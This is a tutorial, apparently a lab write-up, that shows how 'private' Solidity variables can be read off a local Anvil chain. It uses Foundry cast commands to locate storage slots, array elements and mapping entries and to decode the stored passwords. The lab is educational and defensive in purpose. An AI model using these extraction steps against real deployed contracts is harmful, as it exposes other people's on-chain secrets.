## Accessing Private Data Hack

**Reference:** https://solidity-by-example.org/hacks/accessing-private-data/

This demonstrates that we can read **private** data from the blockchain and shows how Solidity stores state variables. The `private` keyword only prevents other contracts from accessing variables—all blockchain data is publicly readable!

---

### 🚀 Setup

**Step 1: Start Anvil (local blockchain)**

```bash
anvil
```

**Step 2: Deploy the Vault Contract**

```bash
forge create src/accessingPrivateDataHack/Vault.sol:Vault\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args $(cast --to-bytes32 $(cast --from-utf8 "mypassword")) 

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

---

### 🔍 Reading Storage Slots

#### 📦 Slot 0: `count` (uint256)

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0
# 0x000000000000000000000000000000000000000000000000000000000000007b

# Decode to decimal:
cast --to-dec 0x000000000000000000000000000000000000000000000000000000000000007b
# 123
```

#### 📦 Slot 1: `owner`, `isTrue`, `u16` (packed)

Multiple variables are packed into a single 32-byte slot (right to left):

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1
# 0x000000000000000000001f01f39fd6e51aad88f6f4ce6ab8827279cfffb92266

# How to decode the packed data:
#   1. address owner (last 20 bytes / 40 hex chars):
#      0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
#   2. bool isTrue (1 byte before the address):
#      0x01 (true)
#   3. uint16 u16 (2 bytes before the bool):
#      0x001f (verify with: cast --to-dec 0x001f) → 31
```

#### 📦 Slot 2: `password` (bytes32, PRIVATE!)

Even though this is marked as `private`, we can still read it!

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 2
# 0x6d7970617373776f726400000000000000000000000000000000000000000000

# Decode the "private" password:
cast --to-utf8 0x6d7970617373776f726400000000000000000000000000000000000000000000
# mypassword
```

**💡 Key Insight:** The `private` keyword doesn't hide data on the blockchain!

---

### 📚 Dynamic Arrays: `User[] private users`

#### Understanding Array Storage

- **Slot 6** stores the array **length**
- **Actual array elements** are stored starting at `keccak256(6)`
- Each element location = `keccak256(6) + (index * elementSize)`

**Two ways to calculate the first element's location:**

```bash
# Method 1: Use the contract's helper function
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getArrayLocation(uint256,uint256,uint256)" 6 0 2 
# 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f

# Method 2: Calculate keccak256 manually (works for index 0)
cast keccak $(cast abi-encode "f(uint256)" 6)
# 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
```

#### Check Initial Array Length

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000000
# Returns 0 - no users added yet
```

#### 👤 Add First User

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "addUser(bytes32)" $(cast --to-bytes32 $(cast --from-utf8 "1password")) \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

**Verify array length increased:**

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000001
# Length = 1 ✓
```

**Read User #0 ID:**

The User struct takes 2 slots: `id` (uint256) and `password` (bytes32)

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f  
# 0x0000000000000000000000000000000000000000000000000000000000000000
# ID = 0 ✓ (correct, since id = users.length before push)
```

**Read User #0 Password:**

Password is stored in the next consecutive slot (+1):

```bash
# Calculate next slot:
# First slot (id):        0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f
# Add 1:  3f + 1 = 40
# Second slot (password): 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40

cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40
# 0x3170617373776f72640000000000000000000000000000000000000000000000

cast --to-utf8 0x3170617373776f72640000000000000000000000000000000000000000000000
# 1password ✓ Successfully read "private" password!
```


#### 👤 Add Second User

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "addUser(bytes32)" $(cast --to-bytes32 $(cast --from-utf8 "2password")) \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

**Verify array length:**

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 6
# 0x0000000000000000000000000000000000000000000000000000000000000002
# Length = 2 ✓
```

**Read User #1 ID:**

Calculate location using index=1, elementSize=2:

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getArrayLocation(uint256,uint256,uint256)" 6 1 2 
# 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41

cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41  
# 0x0000000000000000000000000000000000000000000000000000000000000001
# ID = 1 ✓
```

**Read User #1 Password:**

```bash
# Password is at the next slot: 0x...0d41 + 1 = 0x...0d42
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42
# 0x3270617373776f72640000000000000000000000000000000000000000000000

cast --to-utf8 0x3270617373776f72640000000000000000000000000000000000000000000000
# 2password ✓
```


---

### 🗺️ Mappings: `mapping(uint256 => User) private idToUser`

#### Understanding Mapping Storage

- **Slot 7** is reserved for the mapping (but stays empty)
- **Actual values** are stored at `keccak256(key, slot)` 
- Each mapping entry location = `keccak256(abi.encode(key, 7))`

The `addUser` function stores a **copy** of each user in both the array AND the mapping!

#### 🔍 User #0 in Mapping (key = 0)

**Calculate storage location:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getMapLocation(uint256,uint256)" 7 0 
# 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6df
```

**Read User #0 ID:**

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6df
# 0x0000000000000000000000000000000000000000000000000000000000000000
# ID = 0 ✓
```

**Read User #0 Password:**

```bash
# Password is at the next slot (df + 1 = e0):
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0x6d5257204ebe7d88fd91ae87941cb2dd9d8062b64ae5a2bd2d28ec40b9fbf6e0
# 0x3170617373776f72640000000000000000000000000000000000000000000000

cast --to-utf8 0x3170617373776f72640000000000000000000000000000000000000000000000
# 1password ✓
```

#### 🔍 User #1 in Mapping (key = 1)

**Calculate storage location:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getMapLocation(uint256,uint256)" 7 1 
# 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828
```

**Read User #1 ID:**

```bash
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828
# 0x0000000000000000000000000000000000000000000000000000000000000001
# ID = 1 ✓
```

**Read User #1 Password:**

```bash
# Password at next slot: b828 + 1 = b829
cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829
# 0x3270617373776f72640000000000000000000000000000000000000000000000

cast --to-utf8 0x3270617373776f72640000000000000000000000000000000000000000000000
# 2password ✓
```

---

### 🎯 Summary

This demonstration proves that **"private" data on the blockchain is NOT actually private**:

- ✅ We successfully read the private `password` variable (slot 2)
- ✅ We successfully read private array elements (`users`)
- ✅ We successfully read private mapping values (`idToUser`)

**Key Takeaway:** The `private` keyword only restricts contract-level access. Anyone with blockchain access can read storage directly using tools like `cast storage`. Never store truly sensitive data on-chain!